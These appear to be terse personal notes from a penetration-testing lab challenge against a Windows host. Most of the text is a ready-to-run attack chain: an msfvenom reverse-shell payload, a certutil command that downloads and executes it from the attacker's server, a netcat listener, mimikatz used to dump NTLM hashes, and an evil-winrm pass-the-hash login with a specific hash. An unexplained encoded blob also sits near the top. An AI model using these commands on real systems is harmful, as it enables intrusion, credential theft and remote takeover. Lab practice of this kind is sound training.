

https://temp-mail.org/en/
Email Rate limit
![image](https://github.com/user-attachments/assets/36e0e1bf-8598-4a4e-978c-689f6b24fa2d)

A5B6GFs9S3demojceJUlXBjoKegdeFugQ2zbUsWwaPuvYAn2zh0uJq9gCfbOHS4midX9pupdJITEzi9OhATZzbzz93XtUMyN/Pf4FP13K6P0FpQjnHjrChZe+YvSNxCuFfdix4cTplJrt8ZY3NQkHEXqmagVsMBaZ0pDSpD1+M1ikpdho/wQqcPVBv3DxiejGDsj8FXLvSmT5p0BpU3XICGeRhOQvRmPR5AwMwusKpIxNrmILxLwl9vnY7iCJPFeaMckHxBLarhsSM1Y7WU4nANeUDxv5Y+3t2B0UOmICXuboN3moFYptZ/uDC85+YiOlBdOdyFIcSlXzOlIM0fmp6cIRUpA5v9MVsEN8xDKka4DoMZe70t1N/MRB//KACD/+V4QlKGrTa73mtN7JmHFBQYkvNU69HYRxrmOG8oPOangre6JTDhJaq0IC13XA2hJ+3sIKFOJiIXkYBmINITC2K584r0p1e+bhQQLgCsAXwSMGivZ/9zwXvRT9lMnBwTjQo8iS7YdD2mUqem4Nq+WwVdPPSfn2OZN7WNEpvnm3H7454A+vw9DmO2dvlzEw8cS0zMWhE7VRDi45LiggWonk/LaOQSiAPhwLFiP855i00jEr9CW8DUH6dW7sjSbm77mWPzeb8+qo948w7j5R2k2F45589ar2JI4X25IR9+XlW7BIEIk1KtXikQEO0pz/tvK7EHXAvf2XoOq8pNznRJ273P8gOu8yRE8u/6k2M6x0xQJ8U2e/v+lXA6PM2NwvoMg7G6ahiEvx715+UnmGzjXGpmQsy7VSmfDFLRTrtAM9P8h47Qsv9t06Mdqf9STrFTA8QHL60VtOv7w9ac1lUk0+wG7+XIDBl4g
![image](https://github.com/user-attachments/assets/c0e61761-aa5b-48d2-8456-1d227cffda69)

https://your-it-note.blogspot.com/2024/09/challenge-0-secura1.html

┌──(kali㉿kali)-[~/lab0/95]
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.214 LPORT=443 -b '\x00\x01\x0d' -f exe -o revershell.exe
vi cmd.bat
certutil.exe -f -urlcache -split http://192.168.45.214/lab0/95/revershell.exe c:\windows\temp\revershell.exe && cmd.exe /c c:\windows\temp\revershell.exe
sudo mkdir -p /var/www/html/lab0/95 && sudo mv revershell.exe /var/www/html/lab0/95/
sudo python2 -m SimpleHTTPServer 80
sudo nc -lvp 443 


------
C:\>dir /s local.txt //proof.txt //flag
C:\Program Files\ManageEngine\AppManager14\working> tar -xf mimikatz.zip
C:\Program Files\ManageEngine\AppManager14\working>cd "C:\Program Files\ManageEngine\AppManager14\working\mimikatz-master\x64" //dir also ok
C:\Program Files\ManageEngine\AppManager14\working\mimikatz-master\x64>mimikatz.exe //get Username + NTLM Hash
-------
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 192.168.212.95  -u administrator -H "a51493b0b06e5e35f855245e71af1d14"




